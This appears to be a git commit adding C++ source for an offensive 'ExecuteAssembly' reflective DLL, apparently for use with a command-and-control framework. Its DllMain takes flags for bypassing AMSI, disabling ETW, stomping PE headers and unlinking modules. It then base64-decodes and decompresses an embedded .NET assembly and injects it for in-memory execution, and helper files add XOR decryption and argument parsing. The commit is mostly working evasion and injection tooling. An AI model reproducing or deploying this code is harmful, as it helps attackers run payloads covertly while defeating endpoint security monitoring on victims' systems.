0db97f3878d7de07b415661ccf158e22c26b9499
med0x2e <med.elazaar@gmail.com>
2020-12-21 22:10:14 +0400

    README update

---
+++ ExecuteAssembly/x86|x64(PEB)/ExecuteAssembly/src/ExecuteAssembly.cpp
@@ -0,0 +1,237 @@
+//Author: @med0x2e
+
+#include "Loader.h"
+#include <stdio.h>
+#include "Helpers.h"
+#include "HostCLR.h"
+#include <string>
+#include "GZUtil.h"
+
+extern HINSTANCE hAppInstance;
+
+using namespace std;
+
+#define MAX_CLIARG_COUNT 50
+#define MAX_ARG_LENGTH 150
+#define FLAGS_COUNT 4
+
+struct _ARGUMENTS
+{
+	static const LPCWSTR DELIMITER;
+
+	_ARGUMENTS(LPCWSTR _oneliner)
+	{
+		size_t i = 0;
+		wstring _onelinerpld(_oneliner);
+		wstring* args[] = { &_amsi, &_etw, &_stompheaders, &_unlinkmodules };
+
+		while (_onelinerpld.find(DELIMITER) != wstring::npos && i < FLAGS_COUNT)
+		{
+			*args[i++] = _onelinerpld.substr(0, _onelinerpld.find(DELIMITER));
+			_onelinerpld.erase(0, _onelinerpld.find(DELIMITER) + 1);
+		}
+	}
+
+	wstring _amsi;
+	wstring _etw;
+	wstring _stompheaders;
+	wstring _unlinkmodules;
+};
+
+const LPCWSTR _ARGUMENTS::DELIMITER = L"|";
+
+size_t getCompressedAssemblyLen(LPSTR data, uint8_t _lenbinLength) {
+
+	size_t _binLength = 0;
+	LPSTR pChar = (LPSTR)malloc(sizeof(BYTE) * _lenbinLength + 1);
+	pChar[_lenbinLength] = '\0';
+
+	for (size_t l = 0; l < _lenbinLength; l++) { pChar[l] = data[l + 1]; }
+	sscanf(pChar, "%d", &_binLength);
+	free(pChar);
+
+	printf("[i]: .NET Assembly Length: %d bytes\n", _binLength);
+	fflush(stdout);
+
+	return _binLength;
+}
+
+LPSTR* getAssemblyArgs(LPSTR data, LPSTR b64Assembly, uint32_t* count) {
+
+	printf("[+]: Parsing Arguments \n:");
+	fflush(stdout);
+
+	LPSTR* args = (LPSTR*)malloc(MAX_CLIARG_COUNT * sizeof(LPSTR));
+
+	for (int _c = 0; _c < MAX_CLIARG_COUNT; _c++) {
+		args[_c] = (LPSTR)malloc(MAX_ARG_LENGTH * sizeof(BYTE));
+	}
+
+	TCHAR _openChr[] = { "\"\'" };
+	TCHAR _closeChr[] = { "\"\'}" };
+
+	TCHAR _argsStr[MAX_ARG_LENGTH];
+	strcpy_s(_argsStr, strlen((data + strlen(b64Assembly) + 1)) + 1, (data + strlen(b64Assembly) + 1));
+
+	LPSTR _arg = strmbtok(_argsStr, " ", _openChr, _closeChr);
+	strcpy(args[*count], _arg);
+	(*count)++;
+
+	while ((_arg = strmbtok(NULL, " ", _openChr, _closeChr)) != NULL) {
+		strcpy(args[*count], _arg);
+		(*count)++;
+	}
+
+	size_t i = 0;
+	while (i < *count) {
+		removeChar(args[i], '\"');
+		i++;
+	}
+
+	*count > 0 ? printf("\t[i]: Args count: %d\n", *count) : printf("\t[i]:No Args.\n");
+	fflush(stdout);
+
+	return args;
+
+}
+
+BOOL de64compress(LPSTR b64Assembly, size_t _binLength, size_t* assemblyLength, LPSTR* assemblyBytes, LPSTR* _decompressedData, ULONG* _decompressedDataLen) {
+
+	printf("[+]: Base64 Decoding & Decompressing .NET Assembly... \n");
+	fflush(stdout);
+
+	//b64 decoding to byte array.
+	*assemblyLength = b64DecodeSize(b64Assembly) + 1;
+	*assemblyBytes = (LPSTR)malloc((*assemblyLength));
+
+	if (!b64Decode(b64Assembly, *assemblyBytes, *assemblyLength)) {
+		printf("[-]: Base64 Decoding Failure\n");
+		fflush(stdout);
+		return -1;
+	}
+
+	//gzip decompressing
+	*_decompressedData = (LPSTR)malloc(_binLength);
+	*_decompressedDataLen = _binLength;
+
+	if (assemblyLength > 0) {
+		size_t res = decompress(*_decompressedData, _decompressedDataLen, *assemblyBytes, *assemblyLength);
+		if (Z_OK != res) {
+			printf("[-]:Decompressing Failure\n");
+			fflush(stdout);
+			return 0;
+		}
+	}
+
+	printf("[+]: Base64 Decoding & Decompressing Done.\n");
+	_separator();
+	fflush(stdout);
+
+	return 1;
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
+{
+
+	BOOL bReturnValue = TRUE;
+
+	switch (dwReason) {
+
+	case DLL_QUERY_HMODULE:
+		if (lpReserved != NULL)
+			*(HMODULE *)lpReserved = hAppInstance;
+		break;
+
+	case DLL_PROCESS_ATTACH:
+
+		hAppInstance = hinstDLL;
+		if (lpReserved != NULL) {
+
+			_separator();
+			fflush(stdout);
+
+			// lpReserved: AMSI_FLAG|ETW_FLAG|STOMPHEADERS_FLAG|UNLINKMODULES_FLAG|LLENGTH_FLAG.LENGTH_FLAG.B64_COMPRESS_PAYLOAD.ARGUMENTS
+			LPSTR data = (LPSTR)lpReserved;
+
+			//Extracting CLI options (_flags)
+			LPCWSTR lpReservedW;
+			size_t _leng = MultiByteToWideChar(CP_ACP, 0, data, -1, NULL, 0);
+			lpReservedW = new WCHAR[_leng];
+			MultiByteToWideChar(CP_ACP, 0, data, -1, (LPWSTR)lpReservedW, _leng);
+			_ARGUMENTS _flags(lpReservedW);
+
+			//Assembly length
+			data = data + 8;
+			uint8_t _lenbinLength = data[0] - '0';
+			size_t _binLength = getCompressedAssemblyLen(data, _lenbinLength);
+
+			//Extracting the encoded b64 assembly first
+			data = data + _lenbinLength + 1;
+			LPSTR currentArg;
+			LPSTR nextArg;
+			currentArg = strtok_s(data, " ", &nextArg);
+			LPSTR b64Assembly = trim(currentArg);
+
+			//retrieving arguments
+			uint32_t count = 0;
+			LPSTR* args = getAssemblyArgs(data, b64Assembly, &count);
+
+
+			//base64 decode and gzip decompress
+			size_t assemblyLength = NULL;
+			LPSTR assemblyBytes = NULL;
+			LPSTR _decompressedData = (LPSTR)malloc(_binLength);
+			ULONG _decompressedDataLen = _binLength;
+
+			if (!de64compress(b64Assembly, _binLength, &assemblyLength, &assemblyBytes, &_decompressedData, &_decompressedDataLen)) {
+				printf("[*]:Base64/Decompress Error.\n");
+				fflush(stdout);
+				return -1;
+			}
+
+			//load the assembly bytes array along side passed arguments.
+			if (InjectAssembly(_decompressedData, _decompressedDataLen, args, count,
+				_flags._unlinkmodules.c_str(), _flags._stompheaders.c_str(),
+				_flags._amsi.c_str(), _flags._etw.c_str()) == 1) {
+
+				printf("[*]:Assembly Execution Finished.\n");
+				fflush(stdout);
+			}
+			else {
+				printf("[!]: Something went wrong.\n");
+				fflush(stdout);
+			}
+
+			//cleanup
+			if (args != NULL) {
+				for (size_t _c = 0; _c < count; _c++) {
+					free(args[_c]);
+				}
+				free(args);
+			}
+
+			free(assemblyBytes);
+			free(_decompressedData);
+			delete[] lpReservedW;
+
+		}
+		else {
+			printf("[!]: Err\n");
+			fflush(stdout);
+		}
+
+		fflush(stdout);
+
+		ExitProcess(0);
+		break;
+	case DLL_PROCESS_DETACH:
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+		break;
+	}
+	return bReturnValue;
+}
+
+
+
+
---
+++ ExecuteAssembly/x86|x64(PEB)/ExecuteAssembly/src/Helpers.cpp
@@ -0,0 +1,184 @@
+#include "Helpers.h"
+
+const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+int b64invs[] = { 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57, 58,
+	59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5,
+	6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
+	21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28,
+	29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
+	43, 44, 45, 46, 47, 48, 49, 50, 51 };
+
+ULONG b64DecodeSize(LPCSTR in) {
+	ULONG len;
+	ULONG ret;
+	ULONG i;
+
+	if (in == NULL)
+		return 0;
+
+	len = strlen(in);
+	ret = len / 4 * 3;
+
+	for (i = len; i-- > 0; ) {
+		if (in[i] == '=') {
+			ret--;
+		}
+		else {
+			break;
+		}
+	}
+
+	return ret;
+}
+
+void b64GenDecodeTable() {
+	size_t    inv[80];
+	size_t i;
+
+	memset(inv, -1, sizeof(inv));
+	for (i = 0; i < sizeof(b64chars) - 1; i++) {
+		inv[b64chars[i] - 43] = i;
+	}
+}
+
+int isValidb64Char(uint8_t c) {
+	if (c >= '0' && c <= '9')
+		return 1;
+	if (c >= 'A' && c <= 'Z')
+		return 1;
+	if (c >= 'a' && c <= 'z')
+		return 1;
+	if (c == '+' || c == '/' || c == '=')
+		return 1;
+	return 0;
+}
+
+int b64Decode(LPCSTR in, LPSTR bytes, size_t bytesLen) {
+	size_t len;
+	size_t i;
+	size_t j;
+	int    v;
+
+	if (in == NULL || bytes == NULL)
+		return 0;
+
+	len = strlen(in);
+	if (bytesLen < b64DecodeSize(in) || len % 4 != 0)
+		return 0;
+
+	for (i = 0; i < len; i++) {
+		if (!isValidb64Char(in[i])) {
+			return 0;
+		}
+	}
+
+	for (i = 0, j = 0; i < len; i += 4, j += 3) {
+		v = b64invs[in[i] - 43];
+		v = (v << 6) | b64invs[in[i + 1] - 43];
+		v = in[i + 2] == '=' ? v << 6 : (v << 6) | b64invs[in[i + 2] - 43];
+		v = in[i + 3] == '=' ? v << 6 : (v << 6) | b64invs[in[i + 3] - 43];
+
+		bytes[j] = (v >> 16) & 0xFF;
+		if (in[i + 2] != '=')
+			bytes[j + 1] = (v >> 8) & 0xFF;
+		if (in[i + 3] != '=')
+			bytes[j + 2] = v & 0xFF;
+	}
+
+	return 1;
+}
+
+LPSTR trim(LPSTR str) {
+	char *end;
+	while (isspace((unsigned char)*str)) str++;
+
+	if (*str == 0)
+		return str;
+
+	end = str + strlen(str) - 1;
+	while (end > str && isspace((unsigned char)*end)) end--;
+
+	end[1] = '\0';
+
+	return str;
+}
+
+bool checkCLRVersion(LPCSTR assmblyBytes, size_t assemblyLength, LPCSTR byteSeq, size_t byteSeqLength) {
+	for (size_t _index = 0; _index < assemblyLength; _index++) {
+		if (byteSeq[0] == assmblyBytes[_index] && byteSeq[9] == assmblyBytes[_index + 9]
+			&& byteSeq[2] == assmblyBytes[_index + 2] && byteSeq[6] == assmblyBytes[_index + 6]) {
+			return true;
+		}
+	}
+
+	return false;
+}
+
+LPSTR xorDecrypt(LPSTR data, uint8_t key, size_t _binLength) {
+	for (int _i = 0; _i < _binLength; _i++) {
+		data[_i] = data[_i] ^ key;
+	}
+	return data;
+}
+
+LPSTR toLower(LPSTR strVar)
+{
+	char* pstr = strVar;
+	while (*pstr++)
+		*pstr = (char)tolower(*pstr);
+
+	return pstr;
+}
+
+//stackoverflow.com/questions/26187037/in-c-split-char-on-spaces-with-strtok-function-except-if-between-quotes
+LPSTR strmbtok(LPSTR input, LPSTR delimit, LPSTR openblock, LPSTR closeblock) {
+	static char *token = NULL;
+	char *lead = NULL;
+	char *block = NULL;
+	int iBlock = 0;
+	int iBlockIndex = 0;
+
+	if (input != NULL) {
+		token = input;
+		lead = input;
+	}
+	else {
+		lead = token;
+		if (*token == '\0') {
+			lead = NULL;
+		}
+	}
+
+	while (*token != '\0') {
+		if (iBlock) {
+			if (closeblock[iBlockIndex] == *token) {
+				iBlock = 0;
+			}
+			token++;
+			continue;
+		}
+		if ((block = strchr(openblock, *token)) != NULL) {
+			iBlock = 1;
+			iBlockIndex = block - openblock;
+			token++;
+			continue;
+		}
+		if (strchr(delimit, *token) != NULL) {
+			*token = '\0';
+			token++;
+			break;
+		}
+		token++;
+	}
+	return lead;
+}
+
+void removeChar(LPSTR str, uint8_t toRemove) {
+
+	char *src, *dst;
+	for (src = dst = str; *src != '\0'; src++) {
+		*dst = *src;
+		if (*dst != toRemove) dst++;
+	}
+	*dst = '\0';
+}
